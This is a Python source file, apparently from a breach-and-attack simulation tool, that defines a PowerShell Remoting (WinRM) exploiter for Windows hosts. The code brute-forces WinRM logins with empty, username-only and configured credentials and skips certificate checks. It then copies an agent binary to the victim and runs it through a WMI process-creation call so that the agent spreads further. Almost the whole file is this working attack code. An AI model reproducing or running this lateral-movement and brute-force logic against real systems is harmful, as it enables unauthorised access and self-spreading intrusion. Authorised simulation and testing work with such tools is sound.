import logging
import os
from typing import List, Optional, Tuple, Union

import pypsrp
import spnego
from pypsrp.client import Client
from pypsrp.powershell import PowerShell, RunspacePool
from urllib3 import connectionpool

import infection_monkey.monkeyfs as monkeyfs
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.consts import WIN_ARCH_32, WIN_ARCH_64
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_monkey_depth, get_target_monkey_by_os
from infection_monkey.model import DROPPER_ARG, GET_ARCH_WINDOWS, RUN_MONKEY, VictimHost
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.environment import is_windows_os

LOG = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = "./monkey_temp_bin"


class PowerShellExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    def __init__(self, host: VictimHost):
        PowerShellExploiter._set_sensitive_packages_log_level_to_error()

        super().__init__(host)
        self.client = None

    @staticmethod
    def _set_sensitive_packages_log_level_to_error():
        # If root logger is inherited, extensive and potentially sensitive info could be logged
        sensitive_packages = [pypsrp, spnego, connectionpool]
        for package in sensitive_packages:
            logging.getLogger(package.__name__).setLevel(logging.ERROR)

    def _exploit_host(self):
        self.client = self._authenticate_via_brute_force()
        if not self.client:
            return False

        return self._execute_monkey_agent_on_victim()

    def _authenticate_via_brute_force(self) -> Optional[Client]:
        for username, password in self._get_credentials():
            try:
                client = self._authenticate(username, password)

                LOG.info(
                    "Successfully logged into {self.host.ip_addr} using Powershell. User: "
                    "{username}"
                )
                self.report_login_attempt(True, username, password)

                return client
            except Exception as ex:  # noqa: F841
                LOG.debug(
                    "Error logging into {self.host.ip_addr} using Powershell. User: "
                    "{username}, Error: {ex}"
                )
                self.report_login_attempt(False, username, password)

        return None

    def _get_credentials(self) -> List[Tuple[Optional[str], Optional[str]]]:
        # When username or password is None, this instructs the powershell client to attempt to use
        # The current user's credentials. This is only valid if the client is running from a Windows
        # machine.

        credentials = []
        credentials.extend(self._get_empty_credentials())
        credentials.extend(self._get_username_only_credentials())
        credentials.extend(self._get_username_password_credentials())

        return credentials

    def _get_empty_credentials(self) -> List[Tuple[None, None]]:
        if is_windows_os():
            return [(None, None)]

        return []

    def _get_username_only_credentials(self) -> List[Tuple[str, Optional[str]]]:
        credentials = [(username, "") for username in self._config.exploit_user_list]

        if is_windows_os():
            credentials.extend([(username, None) for username in self._config.exploit_user_list])

        return credentials

    def _get_username_password_credentials(self) -> List[Tuple[str, str]]:
        return [credentials for credentials in self._config.get_exploit_user_password_pairs()]

    def _authenticate(self, username: Optional[str], password: Optional[str]) -> Client:
        ssl = password != ""
        auth = "negotiate" if password != "" else "basic"
        encryption = "auto" if password != "" else "never"

        with Client(
            self.host.ip_addr,
            username=username,
            password=password,
            cert_validation=False,
            ssl=ssl,
            auth=auth,
            encryption=encryption,
        ) as client:
            # attempt to execute dir command to know if authentication was successful
            client.execute_cmd("dir")
            return client

    def _execute_monkey_agent_on_victim(self) -> bool:
        arch = self._get_host_arch()
        self.is_32bit = arch == WIN_ARCH_32

        self._write_virtual_file_to_local_path()

        monkey_path_on_victim = (
            self._config.dropper_target_path_win_32
            if self.is_32bit
            else self._config.dropper_target_path_win_64
        )
        is_monkey_copy_successful = self._copy_monkey_binary_to_victim(monkey_path_on_victim)

        if is_monkey_copy_successful:
            self._run_monkey_executable_on_victim(monkey_path_on_victim)
        else:
            return False

        return True

    def _get_host_arch(self) -> Union[WIN_ARCH_32, WIN_ARCH_64]:
        output = self._execute_cmd_on_host(GET_ARCH_WINDOWS)
        if "64-bit" in output:
            return WIN_ARCH_64
        else:
            return WIN_ARCH_32

    def _execute_cmd_on_host(self, cmd: str) -> str:
        output, _, _ = self.client.execute_cmd(cmd)
        return output

    def _write_virtual_file_to_local_path(self) -> None:
        monkey_fs_path = get_target_monkey_by_os(is_windows=True, is_32bit=self.is_32bit)

        with monkeyfs.open(monkey_fs_path) as monkey_virtual_file:
            with open(TEMP_MONKEY_BINARY_FILEPATH, "wb") as monkey_local_file:
                monkey_local_file.write(monkey_virtual_file.read())

    def _copy_monkey_binary_to_victim(self, dest: str) -> bool:
        try:
            self.client.copy(TEMP_MONKEY_BINARY_FILEPATH, dest)
            return True
        except Exception:
            return False
        finally:
            os.remove(TEMP_MONKEY_BINARY_FILEPATH)

    def _run_monkey_executable_on_victim(self, executable_path) -> None:
        monkey_execution_command = self._build_monkey_execution_command(executable_path)

        with self.client.wsman, RunspacePool(self.client.wsman) as pool:
            ps = PowerShell(pool)
            ps.add_cmdlet("Invoke-WmiMethod").add_parameter("path", "win32_process").add_parameter(
                "name", "create"
            ).add_parameter("ArgumentList", monkey_execution_command)
            ps.invoke()

    def _build_monkey_execution_command(self, executable_path) -> str:
        monkey_params = build_monkey_commandline(
            target_host=self.host,
            depth=get_monkey_depth() - 1,
            vulnerable_port=None,
            location=executable_path,
        )

        return RUN_MONKEY % {
            "monkey_path": executable_path,
            "monkey_type": DROPPER_ARG,
            "parameters": monkey_params,
        }
